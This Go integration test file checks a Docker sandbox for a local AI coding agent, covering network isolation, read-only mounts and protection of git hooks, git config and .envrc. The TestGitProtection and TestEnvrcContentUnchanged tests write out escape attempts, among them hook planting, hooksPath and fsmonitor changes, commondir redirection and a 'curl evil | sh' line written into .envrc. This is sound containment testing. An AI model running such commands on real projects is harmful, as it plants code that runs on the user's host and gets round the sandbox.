//go:build integration

// Integration tests run the probe suite in a real sandbox against a stub
// gateway on host loopback. Run with: go test -tags integration ./...
package check

import (
	"io/fs"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"localllm/assets"
	"localllm/internal/docker"
	"localllm/internal/mask"
	"localllm/internal/probe"
	"localllm/internal/sandbox"
)

const (
	testAgentImage     = "localllm-base:latest"
	testForwarderImage = "localllm-forwarder:latest"
)

func requireDocker(t *testing.T) {
	t.Helper()
	if err := exec.Command("docker", "info").Run(); err != nil {
		t.Skip("docker not available")
	}
	for name, tag := range map[string]string{"forwarder": testForwarderImage, "base": testAgentImage} {
		if exec.Command("docker", "image", "inspect", tag).Run() == nil {
			continue
		}
		ctx, err := fs.Sub(assets.Images, "images/"+name)
		if err != nil {
			t.Fatal(err)
		}
		if err := docker.BuildImage(tag, ctx); err != nil {
			t.Fatalf("build %s: %v", tag, err)
		}
	}
}

// stubGateway serves /v1/models on host loopback and returns its gateway.
func stubGateway(t *testing.T) sandbox.Gateway {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/models" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"data":[{"id":"stub-model"}]}`))
	})}
	go srv.Serve(ln)
	t.Cleanup(func() { srv.Close() })
	return sandbox.Gateway{Host: "host.docker.internal", Port: ln.Addr().(*net.TCPAddr).Port}
}

// projectDir creates a project under the user cache dir, which Docker
// Desktop-style VMs share by default (unlike macOS's per-user temp dir).
func projectDir(t *testing.T) string {
	t.Helper()
	cache, err := os.UserCacheDir()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(cache, 0o700); err != nil {
		t.Fatal(err)
	}
	dir, err := os.MkdirTemp(cache, "localllm-test-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(dir) })
	return dir
}

func startSandbox(t *testing.T, mutate func(*sandbox.Compose)) (*docker.Session, sandbox.Gateway) {
	t.Helper()
	return startInputs(t, sandbox.Inputs{ProjectDir: projectDir(t)}, mutate)
}

// startInputs fills in the common inputs and starts a sandbox.
func startInputs(t *testing.T, in sandbox.Inputs, mutate func(*sandbox.Compose)) (*docker.Session, sandbox.Gateway) {
	t.Helper()
	gw := stubGateway(t)
	in.UID, in.GID = os.Getuid(), os.Getgid()
	in.Gateway = gw
	in.AgentImage, in.ForwarderImage = testAgentImage, testForwarderImage
	spec := sandbox.Build(in)
	if mutate != nil {
		mutate(&spec)
	}
	s, err := docker.Start(spec, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.Close)
	return s, gw
}

func TestContainedSandboxPassesAllProbes(t *testing.T) {
	requireDocker(t)
	s, gw := startSandbox(t, nil)

	results, err := Run(s, gw, Mounts{})
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range results {
		if !r.Passed() {
			t.Errorf("probe %q failed: exit %d (missing=%v, mustSucceed=%v)", r.Name, r.ExitCode, r.Missing, r.MustSucceed)
		}
	}
	// The gateway port must be probed directly on some host address, proving
	// the agent can't bypass the forwarder to reach the gateway.
	if !probesPort(results, gw.Port) {
		t.Errorf("no direct host probe of gateway port %d", gw.Port)
	}
}

func TestBrokenSandboxIsDetected(t *testing.T) {
	requireDocker(t)
	// Put the agent on the normal network too, as a misconfiguration would.
	s, gw := startSandbox(t, func(spec *sandbox.Compose) {
		agent := spec.Services[sandbox.AgentService]
		for name, n := range spec.Networks {
			if !n.Internal {
				agent.Networks[name] = &sandbox.NetworkAttach{}
			}
		}
		spec.Services[sandbox.AgentService] = agent
	})

	results, err := Run(s, gw, Mounts{})
	if err != nil {
		t.Fatal(err)
	}
	failed := probe.Failed(results)
	if len(failed) == 0 {
		t.Fatal("no probe failed although the agent has a route out")
	}
	for _, r := range failed {
		if r.Name == "dns host.docker.internal" {
			return
		}
	}
	t.Errorf("expected the host.docker.internal probe among failures, got %v", names(failed))
}

func probesPort(results []probe.Result, port int) bool {
	suffix := ":" + strconv.Itoa(port)
	for _, r := range results {
		if strings.HasPrefix(r.Name, "host ") && strings.HasSuffix(r.Name, suffix) {
			return true
		}
	}
	return false
}

func names(results []probe.Result) []string {
	var n []string
	for _, r := range results {
		n = append(n, r.Name)
	}
	return n
}

func TestReadOnlyMountRejectsWrites(t *testing.T) {
	requireDocker(t)
	target := sandbox.ReadOnlyRoot + "/ref"
	for _, readOnly := range []bool{true, false} {
		ref := projectDir(t)
		s, gw := startSandbox(t, func(spec *sandbox.Compose) {
			agent := spec.Services[sandbox.AgentService]
			agent.Volumes = append(agent.Volumes, sandbox.Volume{Type: "bind", Source: ref, Target: target, ReadOnly: readOnly})
			spec.Services[sandbox.AgentService] = agent
		})

		results, err := Run(s, gw, Mounts{ReadOnly: []string{target}})
		if err != nil {
			t.Fatal(err)
		}
		var found bool
		for _, r := range results {
			if r.Name != "read-only "+target {
				continue
			}
			found = true
			if r.Passed() != readOnly {
				t.Errorf("read_only=%v: probe passed = %v (exit %d)", readOnly, r.Passed(), r.ExitCode)
			}
		}
		if !found {
			t.Errorf("no read-only probe in %v", names(results))
		}
	}
}

// gitEnv mirrors the CLI's git settings with a fixed identity.
var gitEnv = map[string]string{
	"GIT_CONFIG_COUNT":   "3",
	"GIT_CONFIG_KEY_0":   "safe.directory",
	"GIT_CONFIG_VALUE_0": "*",
	"GIT_CONFIG_KEY_1":   "user.name",
	"GIT_CONFIG_VALUE_1": "agent",
	"GIT_CONFIG_KEY_2":   "user.email",
	"GIT_CONFIG_VALUE_2": "agent@example.com",
}

// gitRepo creates a project that is a git repository with one commit.
func gitRepo(t *testing.T) string {
	t.Helper()
	dir := projectDir(t)
	for _, args := range [][]string{
		{"init", "-q"},
		{"-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init"},
	} {
		if out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	return dir
}

// startProtected starts a sandbox for project with its mask layout applied.
func startProtected(t *testing.T, project string) (*docker.Session, sandbox.Gateway, Mounts) {
	t.Helper()
	layout, err := mask.Plan(project)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { layout.Cleanup(project) })
	if err := layout.Prepare(project); err != nil {
		t.Fatal(err)
	}
	pinned, readOnly, err := layout.Bind(project, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	var m Mounts
	for _, p := range pinned {
		m.Pinned = append(m.Pinned, p.Target)
	}
	for _, r := range readOnly {
		m.ReadOnly = append(m.ReadOnly, r.Target)
	}
	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project, Pinned: pinned, ReadOnly: readOnly, Env: gitEnv}, nil)
	return s, gw, m
}

func requirePass(t *testing.T, results []probe.Result) {
	t.Helper()
	for _, r := range probe.Failed(results) {
		t.Errorf("probe %q failed: exit %d (missing=%v)", r.Name, r.ExitCode, r.Missing)
	}
}

func TestGitProtection(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	// A husky-style hooks dir and a linked worktree, whose parents the agent
	// must not be able to rename away.
	if err := os.MkdirAll(filepath.Join(project, ".husky/_"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{
		{"config", "core.hooksPath", ".husky/_"},
		{"worktree", "add", "-q", filepath.Join(t.TempDir(), "wt")},
	} {
		if out, err := exec.Command("git", append([]string{"-C", project}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	s, gw, mounts := startProtected(t, project)

	results, err := Run(s, gw, mounts)
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)
	for _, want := range []string{"read-only /workspace/.git/hooks", "read-only /workspace/.git/config", "read-only /workspace/.envrc", "pinned /workspace/.git"} {
		if !slices.ContainsFunc(results, func(r probe.Result) bool { return r.Name == want }) {
			t.Errorf("no probe %q", want)
		}
	}

	// Each attempt prints its name when it succeeds; none may.
	escapes, err := s.Capture("sh", "-c", `
try() { name=$1; shift; "$@" >/dev/null 2>&1 && echo "ESCAPED $name"; }
try hook-create touch .git/hooks/pre-commit
try hook-edit sh -c 'echo x >> .git/hooks/pre-commit.sample'
try config-file sh -c 'echo x >> .git/config'
try hooksPath git config core.hooksPath x
try fsmonitor git config core.fsmonitor x
try envrc-edit sh -c 'echo x > .envrc'
try envrc-remove rm -f .envrc
try git-rename mv .git .git-old
try commondir sh -c 'echo ../evil > .git/commondir'
try commondir-remove rm -f .git/commondir
try husky-rename mv .husky .husky-old
try husky-hook touch .husky/_/pre-commit
try worktree-rename mv .git/worktrees/wt .git/worktrees/x
try worktree-commondir sh -c 'echo ../../../evil > .git/worktrees/wt/commondir'
echo DONE`)
	if err != nil {
		t.Fatal(err)
	}
	if escapes = strings.TrimSpace(escapes); escapes != "DONE" {
		t.Errorf("protections bypassed:\n%s", escapes)
	}

	out, err := s.Capture("sh", "-c", `set -e
echo hi > a.txt
git add a.txt
git commit -q -m add
git checkout -q -b feature
echo more >> a.txt
git diff --stat
echo GIT-OK`)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "GIT-OK") || !strings.Contains(out, "a.txt") {
		t.Fatalf("git inside the sandbox failed:\n%s", out)
	}
	if b, _ := exec.Command("git", "-C", project, "branch", "--show-current").Output(); strings.TrimSpace(string(b)) != "feature" {
		t.Errorf("host branch = %q, want feature", b)
	}
	if hooks, _ := filepath.Glob(filepath.Join(project, ".git/hooks/pre-commit")); len(hooks) > 0 {
		t.Errorf("hook planted on host: %v", hooks)
	}
}

func TestEnvrcContentUnchanged(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	envrc := filepath.Join(project, ".envrc")
	if err := os.WriteFile(envrc, []byte("use flake\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	s, _, _ := startProtected(t, project)
	s.Capture("sh", "-c", "echo 'curl evil | sh' > .envrc; echo x >> .envrc")
	if b, _ := os.ReadFile(envrc); string(b) != "use flake\n" {
		t.Errorf(".envrc = %q", b)
	}
}

func TestPlaceholdersRemoved(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	layout, err := mask.Plan(project)
	if err != nil {
		t.Fatal(err)
	}
	s, _, _ := startProtected(t, project)
	s.Capture("true")
	s.Close()
	layout.Cleanup(project)
	for _, rel := range []string{".envrc", ".git/commondir"} {
		if _, err := os.Lstat(filepath.Join(project, rel)); !os.IsNotExist(err) {
			t.Errorf("%s left on the host: %v", rel, err)
		}
	}
}

func TestNonGitProjectStarts(t *testing.T) {
	requireDocker(t)
	s, gw, mounts := startProtected(t, projectDir(t))
	results, err := Run(s, gw, mounts)
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)
}

func TestMissingProtectionIsDetected(t *testing.T) {
	requireDocker(t)
	// Probe for the protections without applying them.
	project := gitRepo(t)
	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project}, nil)
	results, err := Run(s, gw, Mounts{
		ReadOnly: []string{"/workspace/.git/hooks", "/workspace/.git/config"},
		Pinned:   []string{"/workspace/.git"},
	})
	if err != nil {
		t.Fatal(err)
	}
	failed := names(probe.Failed(results))
	for _, want := range []string{"read-only /workspace/.git/hooks", "read-only /workspace/.git/config", "pinned /workspace/.git"} {
		if !slices.Contains(failed, want) {
			t.Errorf("probe %q passed without the protection (failed: %v)", want, failed)
		}
	}
}
